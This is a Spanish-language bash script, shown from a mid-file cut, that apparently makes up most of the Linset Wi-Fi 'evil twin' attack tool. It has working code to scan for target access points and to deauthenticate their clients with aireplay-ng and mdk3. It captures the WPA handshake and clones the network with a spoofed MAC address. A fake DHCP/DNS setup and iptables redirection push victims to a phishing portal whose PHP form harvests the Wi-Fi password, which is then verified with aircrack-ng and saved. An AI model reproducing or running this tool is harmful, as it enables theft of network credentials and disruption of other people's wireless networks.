	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
}

# Escanea toda la red
function Scan {
	
	conditional_clear
	xterm $HOLD -title "Escaneando Objetivos ..." $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
}

# Elige una red de todas las escaneadas
function selection {
	
	conditional_clear
	mostrarheader
	
	
	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
	
	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		vk496 && break
	fi
	
	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	linap=`expr $linap - 1`
	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
	echo "                         Listado de APs Objetivo "
	echo ""
	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
	echo ""
	i=0
	
	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
			
			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*" 
			fi
			
			echo -e " ""$verde"$i")"$blanco"$CLIENTE\t""$amarillo"$MAC"\t""$verde"$CHANNEL"\t""$rojo" $PRIVACY"\t  ""$amarillo"$POWER%"\t""$verde"$ESSID""$rescolor""
			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
	echo
	echo -e ""$verde"("$blanco"*"$verde") Red con Clientes"$rescolor""
	echo ""
	echo "        Selecciona Objetivo               "
	echo -n "      #> "
	read choice
	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}
	
	conditional_clear
	
	askAP
}

# Elige el modo del FakeAP
function askAP {
		
	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
	
	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
		selection && break
	fi
	
	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
		fakeapmode="airbase-ng"
		askauth
	fi
	
	mostrarheader
	while true; do
		
		infoap
		
		echo "MODO DE FakeAP"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Hostapd ("$rojo"Recomendado"$rescolor")"
		echo -e "      "$verde"2)"$rescolor" airbase-ng (Conexion mas lenta)"
		echo -e "      "$verde"3)"$rescolor" Atras"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) fakeapmode="hostapd"; authmode="handshake"; deauthforce; break ;;
			2 ) fakeapmode="airbase-ng"; askauth; break ;;
			3 ) selection; break ;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
	done 
	
} 

# Metodo de comprobacion de PASS si elegiste airbase-ng
function askauth {
	
	conditional_clear
	
	mostrarheader
	while true; do
		
		echo "METODO DE VERIFICACIÓN DE PASS"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Handshake ("$rojo"Recomendado"$rescolor")"
		echo -e "      "$verde"2)"$rescolor" wpa_supplicant (Menos efectivo / Mas fallos)"
		echo -e "      "$verde"3)"$rescolor" Atras"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) authmode="handshake"; deauthforce; break ;;
			2 ) authmode="wpa_supplicant"; webinterface; break ;;
			3 ) askAP; break ;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
	done 
	
} 

function deauthforce {
	
	conditional_clear
	
	mostrarheader
	while true; do
		
		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Estricto"
		echo -e "      "$verde"2)"$rescolor" Normal (Posibilidades de fallo)"
		echo -e "      "$verde"3)"$rescolor" Atras"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) handshakemode="hard"; askclientsel; break ;;
			2 ) handshakemode="normal"; askclientsel; break ;;
			3 ) askauth; break ;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
	done 
}

############################################### < MENU > ###############################################






############################################# < HANDSHAKE > ############################################

# Tipo de Deauth que se va a realizar
function askclientsel {
	
	conditional_clear
	
	while true; do
		mostrarheader
		
		echo "CAPTURAR HANDSHAKE DEL CLIENTE"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Realizar desaut. masiva al AP objetivo"
		echo -e "      "$verde"2)"$rescolor" Realizar desaut. masiva al AP (mdk3)"
		echo -e "      "$verde"3)"$rescolor" Realizar desaut. especifica al AP objetivo"
		echo -e "      "$verde"4)"$rescolor" Volver a escanear las redes"
		echo -e "      "$verde"5)"$rescolor" Salir"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) deauth all; break ;;
			2 ) deauth mdk3; break ;;
			3 ) deauth esp; break ;;
			4 ) killall airodump-ng &>$linset_output_device; vk496; break;;    
			5 ) exitmode; break ;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
	done 
	
}

# 
function deauth {
	
	conditional_clear
	
	iwconfig $WIFI_MONITOR channel $Host_CHAN
	
	case $1 in
		all )
			DEAUTH=deauthall
			capture & $DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
		mdk3 )
			DEAUTH=deauthmdk3
			capture & $DEAUTH &
			CSVDB=$Host_MAC-01.csv
		;;
		esp )
			DEAUTH=deauthesp
			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
			
			if [ $LINEAS_CLIENTES -le 5 ]; then
				DEAUTH=deauthall
				capture & $DEAUTH
				CSVDB=$Host_MAC-01.csv
				deauth
				
			fi
			
			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`	
				deauthesp
			done
			$DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
	esac
	
	
	deauthMENU
	
}

function deauthMENU {
	
	while true; do
		conditional_clear
		mostrarheader
		
		echo "¿SE CAPTURÓ el HANDSHAKE?"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Si" 
		echo -e "      "$verde"2)"$rescolor" No (lanzar ataque de nuevo)"
		echo -e "      "$verde"3)"$rescolor" No (seleccionar otro ataque)"  
		echo -e "      "$verde"4)"$rescolor" Seleccionar otra red"  
		echo -e "      "$verde"5)"$rescolor" Salir"
		echo " "
		echo -n '      #> '
		read yn
		
		case $yn in
			1 ) checkhandshake;;
			2 ) capture; $DEAUTH & ;;
			3 ) conditional_clear; askclientsel; break;;
			4 ) killall airodump-ng &>$linset_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
			5 ) exitmode; break;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
		
	done
}

# Capruta todas las redes
function capture {
	
	conditional_clear
	if ! ps -A | grep -q airodump-ng; then
		
		rm -rf $DUMP_PATH/$Host_MAC*
		xterm $HOLD -title "Capturando datos en el canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
	fi
}

# Comprueba el handshake antes de continuar
function checkhandshake {
	
	if [ "$handshakemode" = "normal" ]; then
		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
			killall airodump-ng &>$linset_output_device
			webinterface
			break
		fi
	elif [ "$handshakemode" = "hard" ]; then
		if pyrit -r $DUMP_PATH/$Host_MAC-01.cap analyze | grep -q "good,"; then
			killall airodump-ng &>$linset_output_device
			webinterface
			break
		fi
	fi
}

############################################# < HANDSHAKE > ############################################






############################################# < ATAQUE > ############################################

# Selecciona interfaz web que se va a usar
function webinterface {
	
	while true; do
		conditional_clear
		mostrarheader
		
		infoap
		echo
		echo "SELECCIONA LA INTERFACE WEB"
		echo
		
		echo -e "$verde""1)"$rescolor" Interface web neutra"
		echo -e "$verde""2)"$rescolor" \e[1;31mSalir"$rescolor""
		
		echo
		echo -n "#? "
		read line
		
		if [ "$line" = "2" ]; then
			exitmode
		elif [ "$line" = "1" ]; then
			conditional_clear
			mostrarheader
			
			infoap
			echo
			echo "SELECCIONA IDIOMA"
			echo
			
			echo -e "$verde""1)"$rescolor" English     [ENG]"
			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
			echo -e "$verde""3)"$rescolor" Italy       [IT]"
			echo -e "$verde""4)"$rescolor" French      [FR]"
			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
			echo -e "$verde""6)"$rescolor" \e[1;31mAtras"$rescolor""
			
			echo
			echo -n "#? "
			read linea
			language=${webinterfaceslenguage[$line]}
			
			if [ "$linea" = "1" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
				NEUTRA
				break
			elif [ "$linea" = "2" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
				NEUTRA
				break
			elif [ "$linea" = "3" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
				NEUTRA
				break
			elif [ "$linea" = "4" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
				NEUTRA
				break
			elif [ "$linea" = "5" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
				NEUTRA
				break
			elif [ "$linea" = "6" ]; then
				continue
			fi
		fi
	
	done
	preattack
	attack
}

# Crea distintas configuraciones necesarias para el script y preapa los servicios
function preattack {
	
# Genera el config de hostapd
echo "interface=$WIFI
driver=nl80211
ssid=$Host_SSID
channel=$Host_CHAN
">$DUMP_PATH/hostapd.conf

# Crea el php que usan las ifaces
echo "<?php
error_reporting(0);

\$count_my_page = (\"../hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Receive form Post data and Saving it in variables

\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"../data.txt\";
\$filename2 = \"../status.txt\";
\$intento = \"../intento.txt\";


// Marge all the variables with text in a single variable. 
\$f_data= ''.\$key1.'';


if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
break;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
break;
}


\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);


\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while(1) 
{

if (file_get_contents(\"\$intento\") == 2) {
	    header(\"location:final.html\");
	    break;
	} 
if (file_get_contents(\"\$intento\") == 1) {
	    header(\"location:error.html\");
	    unlink(\$intento);
	    break;
	}
	
sleep(1);
}

?>" > $DUMP_PATH/data/savekey.php

# Se crea el config del servidor DHCP
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

} 
" >$DUMP_PATH/dhcpd.conf

# Se crea el config del servidor web Lighttpd
echo "server.document-root = \"$DUMP_PATH/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
) 

fastcgi.server = ( \".php\" => ((
		  \"bin-path\" => \"/usr/bin/php-cgi\",
		  \"socket\" => \"/php.socket\"
		)))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.html\" )
" >$DUMP_PATH/lighttpd.conf

# Script (no es mio) que redirige todas las peticiones del DNS a la puerta de enlace (nuestro PC)
echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15   # 4bits de tipo de consulta
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Numero preg y respuestas
      packet+=self.data[12:]                                         # Nombre de dominio original
      packet+='\xc0\x0c'                                             # Puntero al nombre de dominio
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Tipo respuesta, ttl, etc
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # La ip en hex
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))
  
  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Respuesta: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()
" >$DUMP_PATH/fakedns
chmod +x $DUMP_PATH/fakedns
	
}

# Prepara las tablas de enrutamiento para establecer un servidor DHCP/WEB
function routear {
	
	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0
	
	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	echo "1" > /proc/sys/net/ipv4/ip_forward
	
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Ejecuta el ataque
function attack {
	
	if [ "$fakeapmode" = "hostapd" ]; then
		interfaceroutear=$WIFI
	elif [ "$fakeapmode" = "airbase-ng" ]; then
		interfaceroutear=at0
	fi
	
	handshakecheck
	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
	
	if [ "$fakeapmode" = "hostapd" ]; then
		
		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $linset_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
	fi
	
	
	if [ $fakeapmode = "hostapd" ]; then
		killall hostapd &> $linset_output_device
		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
		elif [ $fakeapmode = "airbase-ng" ]; then
		killall airbase-ng &> $linset_output_device
		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
	fi
	sleep 5
	
	routear &
	sleep 3
	
	
	killall dhcpd &> $linset_output_device
	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
	
	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
	lighttpd -f $DUMP_PATH/lighttpd.conf &> $linset_output_device
	
	killall aireplay-ng &> $linset_output_device
	killall mdk3 &> $linset_output_device
	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	
	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
	conditional_clear
	
	while true; do
		mostrarheader
		
		echo "Ataque en curso..."
		echo "                                       "
		echo "      1) Elegir otra red" 
		echo "      2) Salir"
		echo " "
		echo -n '      #> '
		read yn
		case $yn in
			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
			2 ) matartodo; exitmode; break;;
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		esac
	done
	
}

# Comprueba la validez de la contraseña
function handshakecheck {
	
	echo "#!/bin/bash
	
	echo > $DUMP_PATH/data.txt
	echo -n \"0\"> $DUMP_PATH/hit.txt
	echo "" >$DUMP_PATH/loggg
	
	tput civis
	clear
	
	minutos=0
	horas=0
	i=0
	  
	while true; do
	
	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`
	
	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi
	
	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi
	
	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$DUMP_PATH/handcheck

	if [ $authmode = "handshake" ]; then
		echo "if [ -f $DUMP_PATH/intento.txt ]; then
		
		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
		echo \"2\">$DUMP_PATH/intento.txt
		break
		else
		echo \"1\">$DUMP_PATH/intento.txt
		fi
		fi" >> $DUMP_PATH/handcheck
		
		fi
	
	echo "readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep \"DHCPACK on\"| awk '!x[\$0]++' )
	
	echo
	echo -e \"  PUNTO DE ACCESO:\"
	echo -e \"    Nombre..........: "$blanco"$Host_SSID"$rescolor"\"
	echo -e \"    MAC.............: "$amarillo"$Host_MAC"$rescolor"\"
	echo -e \"    Canal...........: "$blanco"$Host_CHAN"$rescolor"\"
	echo -e \"    Fabricante......: "$verde"$Host_MAC_MODEL"$rescolor"\"
	echo -e \"    Tiempo activo...: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
	echo -e \"    Intentos........: "$rojo"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$rescolor"\"
	echo
	echo -e \"  CLIENTES:\"
	
	x=0
	for line in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"   
	done
	
	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
	
	
	if [ $authmode = "handshake" ]; then
		echo "let i=\$i+1
		sleep 1">>$DUMP_PATH/handcheck
		
	elif [ $authmode = "wpa_supplicant" ]; then
		echo "sleep 5
		
		killall wpa_supplicant &>$linset_output_device
		killall wpa_passphrase &>$linset_output_device
		let i=\$i+5">>$DUMP_PATH/handcheck
	fi
	
	echo "done
	clear
	echo \"1\" > $DUMP_PATH/status.txt
	
	sleep 7
	
	killall mdk3 &>$linset_output_device
	killall aireplay-ng &>$linset_output_device
	killall airbase-ng &>$linset_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$linset_output_device
	killall hostapd &>$linset_output_device
	killall lighttpd &>$linset_output_device
	killall dhcpd &>$linset_output_device
	killall wpa_supplicant &>$linset_output_device
	killall wpa_passphrase &>$linset_output_device
	
	echo \"
	SSID: $Host_SSID
	BSSID: $Host_MAC ($Host_MAC_MODEL)
	Channel: $Host_CHAN
	Security: $Host_ENC
	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $DUMP_PATH/data.txt)
	\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck
	
	
	if [ $authmode = "handshake" ]; then
		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"Se ha guardado en "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\" 
		">>$DUMP_PATH/handcheck
		
	elif [ $authmode = "wpa_supplicant" ]; then
		echo "echo -e \"Se ha guardado en "$rojo"$HOME/$Host_SSID-password.txt"$rescolor"\"">>$DUMP_PATH/handcheck
	fi
	
	echo "kill -INT \$(ps a | grep bash| grep linset | awk '{print \$1}') &>$linset_output_device">>$DUMP_PATH/handcheck
	chmod +x $DUMP_PATH/handcheck
}


############################################# < ATAQUE > ############################################






############################################## < COSAS > ############################################

# Deauth a todos
function deauthall {
	
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando a todos de $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {
	
	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
	sleep 15
	kill $mdk3PID &>$linset_output_device
}

# Deauth a un cliente específico
function deauthesp {
	
	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Cierra todos los procesos
function matartodo {
	
	killall aireplay-ng &>$linset_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
	killall hostapd &>$linset_output_device
	killall lighttpd &>$linset_output_device
	killall dhcpd &>$linset_output_device
	killall xterm &>$linset_output_device
	
}



############################################## < COSAS > ############################################






######################################### < INTERFACES WEB > ########################################

# Crea el contenido de la iface T⁻LINK_WRXXXX
function NEUTRA {
	
	if [ ! -d $DUMP_PATH/data ]; then
		mkdir $DUMP_PATH/data
	fi
	
            cp  scama/index.html $DUMP_PATH/index.html ;
	cp -R scama/* $DUMP_PATH/ ;
	cp -R scama/* $DUMP_PATH/data;
	rm $DUMP_PATH/data/index.html;
	rm $DUMP_PATH/final.html;
	rm $DUMP_PATH/error.html;
	rm $DUMP_PATH/loading.gif  > /dev/null 2>&1;
	
	
}
######################################### < INTERFACES WEB > ########################################


mostrarheader && setresolution && setinterface
